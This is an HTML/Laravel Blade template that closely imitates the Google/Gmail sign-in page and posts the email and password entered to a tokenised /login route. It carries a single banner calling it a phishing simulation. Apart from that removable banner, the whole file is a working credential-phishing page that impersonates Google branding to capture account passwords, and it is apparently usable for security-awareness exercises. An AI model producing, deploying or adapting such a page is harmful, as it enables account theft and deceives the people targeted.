<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Google Sans', Roboto, Arial, sans-serif; 
            background-color: #fff; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
            color: #202124; 
        }
        .container { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 48px; 
        }
        .logo { 
            margin-bottom: 24px; 
        }
        .logo img { 
            width: 75px; 
            height: 24px; 
        }
        .card { 
            background: #fff; 
            border: 1px solid #dadce0; 
            border-radius: 8px; 
            padding: 48px 40px 36px; 
            width: 450px; 
            max-width: 100%; 
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.1); 
        }
        .header { 
            text-align: center; 
            margin-bottom: 24px; 
        }
        .header h1 { 
            color: #202124; 
            font-size: 24px; 
            font-weight: 400; 
            line-height: 1.3333; 
            margin-bottom: 0; 
        }
        .header p { 
            color: #5f6368; 
            font-size: 16px; 
            letter-spacing: 0.1px; 
            line-height: 1.5; 
            margin-top: 8px; 
        }
        .form-group { 
            margin-bottom: 24px; 
        }
        .form-control { 
            background-color: transparent; 
            border: 1px solid #dadce0; 
            border-radius: 4px; 
            color: #202124; 
            font-size: 16px; 
            height: 56px; 
            padding: 13px 15px; 
            width: 100%; 
            outline: none; 
        }
        .form-control:focus { 
            border-color: #1a73e8; 
            border-width: 2px; 
            padding: 12px 14px; 
        }
        .form-control:focus + .floating-label, 
        .form-control:not(:placeholder-shown) + .floating-label { 
            color: #1a73e8; 
            font-size: 12px; 
            transform: translateY(-20px); 
        }
        .input-wrapper { 
            position: relative; 
        }
        .floating-label { 
            color: #5f6368; 
            font-size: 16px; 
            left: 15px; 
            pointer-events: none; 
            position: absolute; 
            top: 18px; 
            transition: all 0.2s; 
        }
        .actions { 
            display: flex; 
            justify-content: space-between; 
            margin-top: 32px; 
        }
        .link { 
            color: #1a73e8; 
            font-size: 14px; 
            font-weight: 500; 
            text-decoration: none; 
        }
        .link:hover { 
            text-decoration: underline; 
        }
        .btn-next { 
            background-color: #1a73e8; 
            border: none; 
            border-radius: 4px; 
            color: #fff; 
            font-size: 14px; 
            font-weight: 500; 
            height: 36px; 
            min-width: 80px; 
            padding: 9px 24px; 
            cursor: pointer; 
        }
        .btn-next:hover { 
            background-color: #1765cc; 
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); 
        }
        .btn-next:focus { 
            background-color: #1765cc; 
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); 
        }
        .disclaimer { 
            position: fixed; 
            bottom: 10px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(255, 0, 0, 0.9); 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            font-size: 12px; 
            z-index: 1000; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <g id="qaEJec">
                    <path fill="#ea4335" d="m12 .02c-5.5 0-9.98 4.48-9.98 9.98s4.48 9.98 9.98 9.98c2.43 0 4.68-.8 6.24-2.25v1.45h6.26v-19.41zm0 6.26c2.05 0 3.73 1.68 3.73 3.73s-1.68 3.73-3.73 3.73-3.73-1.68-3.73-3.73 1.68-3.73 3.73-3.73z"></path>
                    <path fill="#4285f4" d="m25.54 22.04c0 3.24-2.64 5.98-5.88 5.98h-13.42c-3.24 0-5.88-2.74-5.88-5.98v-15.76c0-3.24 2.64-5.98 5.88-5.98h13.42c3.24 0 5.88 2.74 5.88 5.98z"></path>
                </g>
            </svg>
        </div>
        <div class="card">
            <div class="header">
                <h1>Sign in</h1>
                <p>Use your Google Account</p>
            </div>
            <form method="POST" action="{{ url('/login/' . $token) }}">
                @csrf
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="email" name="email" class="form-control" placeholder=" " required>
                        <label class="floating-label">Email or phone</label>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="password" name="password" class="form-control" placeholder=" " required>
                        <label class="floating-label">Enter your password</label>
                    </div>
                </div>
                <div class="actions">
                    <a href="#" class="link">Forgot email?</a>
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        </div>
    </div>
    <div class="disclaimer">
        ⚠️ This is a phishing simulation for educational purposes. Do not use real credentials.
    </div>
</body>
</html>
